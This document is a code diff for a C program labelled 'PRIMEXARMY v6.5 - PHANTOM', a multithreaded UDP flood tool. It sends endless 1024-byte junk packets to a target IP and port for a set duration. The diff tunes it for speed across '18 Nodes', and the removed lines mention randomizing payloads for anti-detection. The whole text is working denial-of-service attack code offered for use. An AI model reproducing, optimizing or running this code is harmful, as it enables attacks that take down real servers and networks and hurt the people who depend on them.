@@ -7,9 +7,8 @@
 #include <unistd.h>
 #include <time.h>
 #include <fcntl.h>
-#include <netinet/ip.h>
 
-/* ⚔️ PRIMEXARMY v6.5 - PHANTOM UDP (Optimized) ⚔️ */
+/* ⚔️ PRIMEXARMY v6.5 - PHANTOM EXTREME (Optimized for 18 Nodes) ⚔️ */
 
 struct thread_data {
     char ip[16];
@@ -22,39 +21,29 @@ void *prime_strike(void *arg) {
     int sock;
     struct sockaddr_in server_addr;
     
+    // UDP Socket creation
     if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;
 
-    // ✨ NON-BLOCKING & TOS (Type of Service) for Priority
+    // ✨ PERFORMANCE FIX: Non-blocking mode
     fcntl(sock, F_SETFL, O_NONBLOCK);
-    int tos = 0x10; 
-    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
 
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(data->port);
     server_addr.sin_addr.s_addr = inet_addr(data->ip);
 
+    // Optimized Payload (Junk Data)
     char payload[1024];
+    for (int i = 0; i < 1024; i++) payload[i] = (char)(rand() % 255);
+
     time_t end_time = time(NULL) + data->duration;
-    unsigned long int packet_count = 0;
-
-    while (1) {
-        // Optimization: Time check every 5000 packets for raw speed
-        if (packet_count % 5000 == 0) {
-            if (time(NULL) >= end_time) break;
+    
+    // 🚀 ULTRA-FAST LOOP: Sabse kam checks
+    while (time(NULL) < end_time) {
+        // Ek baar mein multiple packets bhejo bina loop break kiye
+        for (int i = 0; i < 100; i++) {
+            sendto(sock, payload, 1024, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
         }
-
-        // Randomizing payload every few packets for anti-detection
-        if (packet_count % 10 == 0) {
-            for (int i = 0; i < 64; i++) {
-                payload[i] = (char)(rand() % 256);
-            }
-        }
-
-        int packet_size = 128 + (rand() % 896); // 128 to 1024 bytes
-        
-        sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-        packet_count++;
     }
 
     close(sock);
@@ -73,23 +62,22 @@ int main(int argc, char *argv[]) {
     strncpy(data.ip, argv[1], 15);
     data.port = atoi(argv[2]);
     data.duration = atoi(argv[3]);
-    int threads = atoi(argv[4]);
+    int threads_count = atoi(argv[4]);
 
-    pthread_t thread_id[threads];
+    pthread_t *thread_id = malloc(threads_count * sizeof(pthread_t));
     srand(time(NULL));
 
-    printf("🚀 [PHANTOM v6.5] Strike on %s:%d | Threads: %d\n", data.ip, data.port, threads);
+    printf("🚀 [PHANTOM v6.5] Target: %s:%d | Nodes: 6 | Threads: %d\n", data.ip, data.port, threads_count);
 
-    for (int i = 0; i < threads; i++) {
-        if (pthread_create(&thread_id[i], NULL, prime_strike, (void *)&data) != 0) {
-            continue; 
-        }
+    for (int i = 0; i < threads_count; i++) {
+        pthread_create(&thread_id[i], NULL, prime_strike, (void *)&data);
     }
 
-    for (int i = 0; i < threads; i++) {
+    for (int i = 0; i < threads_count; i++) {
         pthread_join(thread_id[i], NULL);
     }
 
-    printf("✅ [FINISHED] Operation Complete.\n");
+    free(thread_id);
+    printf("✅ [FINISHED] Strike Complete.\n");
     return 0;
 }
